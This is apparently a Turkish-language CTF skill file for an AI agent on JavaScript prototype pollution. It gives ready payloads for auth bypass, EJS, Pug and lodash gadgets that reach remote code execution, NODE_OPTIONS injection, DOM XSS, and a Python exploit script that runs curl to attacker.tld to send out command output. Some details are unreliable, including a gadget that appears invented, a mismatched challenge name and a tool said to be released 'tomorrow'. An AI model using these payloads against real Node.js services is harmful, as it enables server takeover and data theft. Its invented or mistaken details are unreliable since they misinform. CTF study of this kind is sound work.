---
name: prototype-pollution
description: JavaScript prototype pollution — Object.prototype'u kirleterek auth bypass, RCE, XSS gadget chains (server-side Node.js ve client-side)
tags: [ctf, web, prototype-pollution, javascript, node, express, lodash, jquery, rce, xss, gadget-chain]
triggers:
  - "prototype pollution"
  - "__proto__"
  - "constructor.prototype"
  - "Object.prototype"
  - "Node.js Express"
  - "lodash merge"
  - "JSON.parse"
  - "deep merge"
  - "query string array"
  - "?a[b]=c"
  - "merge user input"
  - "polluted property"
  - "ppfuzz"
  - "ppmap"
  - "isAdmin: true"
difficulty: hard
category: web
solved_challenges:
  - "DiceCTF 2022 - blazingfast (Node.js PP)"
  - "Hxp 2022 - kalmarctf-multiform (PP → RCE)"
  - "Google CTF 2022 - mistake (PP via JSON parse)"
  - "TJCTF 2022 - oh-no (PP + Express)"
  - "WolvCTF 2024 - dont-touch-grass (PP)"
related_skills:
  - jwt-web-bypass
  - sqli-exploitation
  - ssrf-ssti-chain
  - deserialization
---

# JavaScript Prototype Pollution — `Object.prototype` Üzerinden Kontrol

JavaScript'in mirası: her object `Object.prototype`'tan miras alır. Eğer user input'unu derinlemesine bir nesneye merge ediyorsan ve user `__proto__` veya `constructor.prototype` set ediyorsa, **tüm uygulamadaki tüm object'lerin** yeni özelliği olur. Auth bypass'tan RCE'ye uzanan saldırı zinciri başlangıcı.

---

## Ne Zaman Kullan

İpuçları:
- Backend Node.js (`X-Powered-By: Express`)
- Object merge işlemleri: `_.merge()`, `_.set()`, `Object.assign(target, userInput)`
- Query string'de array notation: `?a[b]=c` veya `?a[__proto__][isAdmin]=true`
- JSON parse + deep merge
- Config merge (`mergeOptions`)
- Template engine + user data (PP gadget'tan RCE'ye)

### Açık olan deep merge kütüphaneleri (geçmişte zafiyetli)
- `lodash` (< 4.17.21)
- `merge`, `deepmerge`
- `mongoose`
- `express` (qs library körü)

---

## Temel Saldırı

### Server-side Test
```javascript
// Hedef kodu (savunmasız)
const config = {};
_.merge(config, JSON.parse(req.body));
if (config.isAdmin) {
    // admin işlemleri
}
```

Saldırı request:
```http
POST /api/save HTTP/1.1
Content-Type: application/json

{"__proto__": {"isAdmin": true}}
```

Sonuç: `Object.prototype.isAdmin = true`. Tüm `{}` `{isAdmin: true}` olur — `if (config.isAdmin)` true döner!

### Query String Pollution (Express qs)
```http
GET /?__proto__[isAdmin]=true HTTP/1.1
```
Express default `qs` parser bunu `{__proto__: {isAdmin: 'true'}}` olarak parse eder. `Object.assign(req.user, req.query)` polluted.

---

## Pollution Vektörleri

```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
{"constructor.prototype.polluted": "yes"}     // bazı parser'larda

// JSON.parse(...)["polluted"] === "yes" sonrasında
```

```
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
?a[__proto__][b]=c
```

---

## Tespit

```javascript
// Client-side test (browser console)
Object.prototype.polluted = "yes";
console.log(({}).polluted);  // "yes" → polluted

// Tespit: response'da prototype değiştirme etkisi gör
```

Otomatik tools:
```bash
# Client-side PP scan
git clone https://github.com/dwisiswant0/ppmap
ppmap -u "https://target.tld"

# Server-side PP scan
git clone https://github.com/kosmosec/proto-find
proto-find -l urls.txt
```

---

## Saldırı Zinciri 1 — Auth Bypass (En Basit)

```http
POST /api/profile HTTP/1.1
Content-Type: application/json
Cookie: session=normalUser

{"__proto__": {"isAdmin": true}}
```

Sonra:
```http
GET /api/admin HTTP/1.1
Cookie: session=normalUser
```

Admin endpoint kontrolü: `if (req.user.isAdmin)`. `req.user`'da `isAdmin` field yok ama `Object.prototype`'tan miras alıyor → true.

---

## Saldırı Zinciri 2 — Express Gadget → RCE

Express + ejs/pug/handlebars + pollution → SSTI → RCE.

### EJS Engine Gadget
```http
POST /api/save HTTP/1.1

{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');v"}}
```

Tetikleyici:
```http
GET /any/page/that/renders/ejs HTTP/1.1
```

EJS template render ederken `outputFunctionName` polluted → kodun içine kötü kod enjekte → `execSync('id')` çalışır.

### Pug Engine Gadget
```http
POST /api/save HTTP/1.1
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
```

### Express Middleware Gadget — `body-parser`
```javascript
// body-parser PP
{"__proto__": {"jsonparseFn": "function() {return process.mainModule.require('child_process').execSync('id').toString()}"}}
```

---

## Saldırı Zinciri 3 — Lodash Gadget

```javascript
// lodash.template
{"__proto__": {"sourceURL": "
return process.mainModule.require('child_process').execSync('id')"}}

// lodash.zipObjectDeep
_.zipObjectDeep(['__proto__.isAdmin'], [true]);
```

---

## Saldırı Zinciri 4 — Mongoose / NoSQL Injection

```javascript
// Mongoose model save
const user = new User(req.body);  // body: {"__proto__": {"isAdmin": true}}
user.save();

// Mongoose query
User.findOne(req.body);  // {"__proto__": {"$regex": "/.*/"}} → tüm kullanıcılar
```

---

## Saldırı Zinciri 5 — Client-Side DOM XSS via PP

Client-side PP (jQuery, lodash on frontend) + DOM sinks (`innerHTML`, `eval`) = stored XSS.

Saldırı URL'si:
```
https://target.tld/?__proto__[src]=data:,alert(1)//
```

jQuery `$.extend()` kullanıyorsa, `Object.prototype.src` set → tüm `<img>`'lerin `src`'si polluted → tetiklenir.

---

## Gadget Bulma Stratejisi

1. **Source identification:** Kullanıcı input nereye merge ediliyor?
2. **Sink identification:** Hangi property'ler kontrol akışını veya kod yürütmeyi etkiler?
3. **Reachability:** Source → sink yolu var mı?

### Yaygın Gadget Property'leri

| Gadget Property | Etkilediği Yer | Sonuç |
|---|---|---|
| `isAdmin`, `admin`, `role` | Auth kontrol | Privilege escalation |
| `outputFunctionName` | EJS template | RCE |
| `sourceURL` | lodash.template | RCE (\n inject) |
| `block.type`, `block.line` | Pug | RCE |
| `shell`, `env`, `argv0`, `NODE_OPTIONS` | child_process.spawn | RCE |
| `extension`, `_default` | Marked, fs | LFI/path traversal |
| `proxy` | http requests | SSRF |
| `cookies`, `cookie` | Express cookie | Session hijack |

---

## Tip 6 — `NODE_OPTIONS` Inject (En Güçlü RCE)

```http
POST /api/config HTTP/1.1

{"__proto__": {"env": {"NODE_OPTIONS": "--require=/tmp/exploit.js"}, "shell": "node"}}
```

Sonra Node `child_process.spawn(...)` veya benzer çağrı yapıldığında `/tmp/exploit.js` execute olur.

```javascript
// /tmp/exploit.js içine yazılan dosya
require('child_process').execSync('id > /tmp/pwned');
```

Detaylı: https://blog.sonarsource.com/blitzjs-prototype-pollution/

---

## Korunma Kodları (PP Detect)

```javascript
function detectPP() {
    return {}.polluted !== undefined;
}

// Tüm prototype zincirini test et
function deepCheck(obj) {
    for (const k of ['__proto__', 'constructor', 'prototype']) {
        if (k in obj) return true;
    }
    return false;
}
```

---

## Manuel Exploit Workflow

```python
# pp_exploit.py
import requests

URL = 'https://target.tld'

# 1. Pollute Object.prototype
pollute = {"__proto__": {"isAdmin": True, "outputFunctionName": "x;require('child_process').execSync('curl http://attacker.tld/$(id|base64)');v"}}

r = requests.post(f'{URL}/api/save', json=pollute, cookies={'sess': 'abc'})
print('Pollute:', r.status_code, r.text[:200])

# 2. Tetikle (template render)
r = requests.get(f'{URL}/profile', cookies={'sess': 'abc'})
print('Trigger:', r.status_code)

# 3. Out-of-band callback'i kontrol et
# attacker.tld access log'una bak
```

---

## Tuzaklar

1. **`__proto__` field engellenebilir** — JSON.parse default `__proto__`'yu Object'e koyar mı? Hayır, raw key olarak kalır. Ama `_.merge` recurse ederken `__proto__`'ya yazar. Bazı kütüphaneler bunu engeller.
2. **`Object.create(null)`** — prototype'sız object oluşturmak savunma. Bunu kullanan endpoint'lerde PP çalışmaz.
3. **Map / Set** — JavaScript Map ve Set Object.prototype'tan ayrı zincir. PP onları etkilemez.
4. **Strict mode** — bazı durumlarda `__proto__` yazımı throw eder ama `_.merge` strict değil.
5. **Frozen prototype** — `Object.freeze(Object.prototype)` ile prototype dondurulmuş → PP olmaz.
6. **Class fields** — modern Node sürümlerinde class field syntax PP'den etkilenmez (kendi instance field'ları).
7. **Lodash 4.17.21+** PP fix'ler içeriyor ama bazıları hala bypass edilebilir.

---

## Cross-Skill Pivot

```
Node.js / JavaScript backend → object merge tespit
                            ├── _.merge / Object.assign user input → PP test
                            ├── PP başarılı → gadget ara
                            │   ├── EJS/Pug → RCE
                            │   ├── child_process → NODE_OPTIONS RCE
                            │   ├── isAdmin → auth bypass
                            │   └── DOM sink → client-side XSS
                            └── PP yok → diğer web skill'lere bak
```

---

## Tools

```bash
# Client-side PP scanner
git clone https://github.com/dwisiswant0/ppmap
# Tarayıcı eklentisi: PortSwigger PP Burp extension

# Server-side scan
pip install ppfuzz   # yarın çıkacak ama benzer projeler
git clone https://github.com/kosmosec/proto-find

# Manual
# Burp + repeater + Pollute payload'ları
```

---

## Ek Kaynaklar

- BlackFan / Sonar Research PP serisi: https://github.com/BlackFan/client-side-prototype-pollution
- PortSwigger PP labs: https://portswigger.net/web-security/prototype-pollution
- HackTricks PP page: https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
- "Server-side prototype pollution" Gareth Heyes (PortSwigger 2022)
